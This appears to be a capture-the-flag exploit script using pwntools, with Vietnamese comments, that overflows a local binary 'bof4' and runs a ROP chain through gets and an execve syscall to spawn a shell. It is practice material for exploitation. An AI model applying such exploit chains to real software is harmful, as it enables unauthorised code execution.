from pwn import *

exe = ELF("./bof4", checksec=False)

r = process("./bof4")

pop_rdi = 0x000000000040220e
pop_rsi = 0x00000000004015ae
pop_rdx = 0x00000000004043e4
pop_rax = 0x0000000000401001
syscall = 0x000000000040132e
rw_section = 0x406e00

payload = b'a'*88       #offset rip
payload += p64(pop_rdi) + p64(rw_section)   #do gets chi can setup arg[1] nen ta set rdi 
                                            # la dia chi se ghi chuoi vao
payload += p64(exe.sym['gets'])             #goi ham gets de nhap vao chuoi tai dia chi rw_section

#tiep den ta se thuc thi ham execve("/bin/sh", 0, 0)

payload += p64(pop_rdi) + p64(rw_section)   # truyen tham so vao execve : "/bin/sh"
payload += p64(pop_rsi) + p64(0)            #truyen thanh so thu 2 : 0 (null)
payload += p64(pop_rdx) + p64(0)            #truyen tham so thu 3: 0 (null)
payload += b'a' * 0x28
payload += p64(pop_rax) + p64(0x3b)         #truyen tham so thuc thi vao rax
payload += p64(syscall)

r.sendline(payload)
r.sendline(b'/bin/sh')

r.interactive()
